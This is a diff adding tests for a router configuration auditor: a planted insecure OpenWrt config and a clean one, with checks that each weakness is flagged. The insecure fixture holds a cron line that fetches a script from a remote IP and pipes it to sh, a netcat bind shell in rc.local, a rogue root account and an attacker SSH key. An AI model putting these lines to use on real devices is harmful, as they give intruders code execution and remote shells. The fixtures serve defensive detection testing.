@@ -277,4 +277,151 @@ echo "x" >"$S/srv1/20261111T100000Z.norm"; echo 20261111T100000Z >"$S/srv1/lates
 out=$(run --out "$O" 2>&1)
 t_has "$out" "edge1" "device from the store audited"
 t_hasnt "$out" "srv1 " "linux device skipped (the Linux scripts cover it)"
+t_start "OpenWRT"
+# A router as NW-01 saves it: problems planted, then a clean one.
+cat >"$T_TMP/owrt-bad.cfg" <<'CFG'
+===release
+DISTRIB_ID='OpenWrt'
+===uci
+package dropbear
+
+config dropbear
+	option PasswordAuth 'on'
+	option Port '22'
+
+package uhttpd
+
+config uhttpd 'main'
+	list listen_http '0.0.0.0:80'
+	list listen_https '0.0.0.0:443'
+	option redirect_https '0'
+
+package firewall
+
+config zone
+	option name 'wan'
+	option input 'ACCEPT'
+	option forward 'REJECT'
+
+config forwarding
+	option src 'wan'
+	option dest 'lan'
+
+config rule
+	option name 'ssh-in'
+	option src 'wan'
+	option dest_port '22'
+	option target 'ACCEPT'
+
+config redirect
+	option name 'web'
+	option src 'wan'
+	option src_dport '80'
+	option dest_ip '192.168.220.10'
+	option dest_port '80'
+	option target 'DNAT'
+
+config redirect
+	option name 'rdp'
+	option src 'wan'
+	option src_dport '3389'
+	option dest_ip '192.168.220.79'
+	option target 'DNAT'
+
+package upnpd
+
+config upnpd 'config'
+	option enabled '1'
+
+package snmpd
+
+config community
+	option community 'public'
+
+package system
+
+config system
+	option hostname 'router'
+
+package wireless
+
+config wifi-iface 'x'
+	option key 'Sup3rS3cretWifi'
+===passwd
+root:x:0:0:root:/root:/bin/ash
+toor:x:0:0:toor:/root:/bin/ash
+===keys
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl evil@kali
+===cron
+*/5 * * * * wget -qO- http://203.0.113.9/x | sh
+===startup
+S50telnet
+===rc.local
+nc -lp 4444 -e /bin/ash &
+exit 0
+CFG
+out=$($SH "$C" --out "$O" --no-color --file "$T_TMP/owrt-bad.cfg" 2>&1)
+t_has "$out" "[!] owrt-bad (openwrt): " "the vendor is recognised and the device line shows HIGH"
+for x in "the outside (wan) zone ACCEPTs everything sent to the router" "outside to inside forwarding" \
+         "router management open from the outside (port 22)" "UPnP is on" "default/guessable SNMP community" \
+         "SSH (dropbear) listens on every interface" "web admin (LuCI) over plain HTTP" "a second account with root rights (UID 0)" \
+         "SSH key(s) can log in as root" "root cron job on the router" "telnet starts at boot" "a command in /etc/rc.local" \
+         "a management or database port is forwarded from the outside" "no remote log server"; do
+    t_has "$out$(cat "$(printf '%s\n' "$out" | sed -n 's/^All results: //p' | tail -n 1)/findings.txt")" "$x" "found: $x"
+done
+f=$(cat "$(printf '%s\n' "$out" | sed -n 's/^All results: //p' | tail -n 1)/findings.txt")
+t_has "$f" "80 -> 192.168.220.10:80" "port forwards are listed (the scored paths)"
+t_hasnt "$out$f" "Sup3rS3cretWifi" "the Wi-Fi key is never shown"
+cat >"$T_TMP/owrt-ok.cfg" <<'CFG'
+===uci
+package dropbear
+
+config dropbear
+	option PasswordAuth 'on'
+	option Interface 'lan'
+
+package uhttpd
+
+config uhttpd 'main'
+	list listen_https '192.168.220.2:443'
+	option redirect_https '1'
+
+package firewall
+
+config zone
+	option name 'wan'
+	option input 'REJECT'
+	option forward 'REJECT'
+
+config redirect
+	option name 'web'
+	option src 'wan'
+	option src_dport '80'
+	option dest_ip '192.168.220.10'
+	option target 'DNAT'
+
+package system
+
+config system
+	option log_ip '192.168.220.30'
+===passwd
+root:x:0:0:root:/root:/bin/ash
+===keys
+===cron
+===startup
+S50dropbear
+CFG
+out=$($SH "$C" --out "$O" --no-color --file "$T_TMP/owrt-ok.cfg,openwrt" 2>&1)
+t_has "$out" "[ok] owrt-ok (openwrt): nothing found" "a clean router: nothing found"
+t_hasnt "$out" "[!] owrt-ok" "no HIGH"
+
+t_start "questions"
+if command -v script >/dev/null 2>&1; then
+    printf 'ROOT stuff\n' >"$T_TMP/plain.cfg"
+    # no saved configs: asked for a file, then what device it is (o = OpenWRT)
+    printf '%s\no\n' "$T_TMP/owrt-ok.cfg" >"$T_TMP/ans"
+    tt=$(BT_NO_TTY=0 script -qc "$SH '$C' --out '$T_TMP/out2' --no-color" /dev/null <"$T_TMP/ans" 2>&1)
+    t_has "$tt" "Config file to audit?" "with nothing saved it asks for a file"
+    t_has "$tt" "owrt-ok (openwrt)" "and audits it"
+fi
 t_done
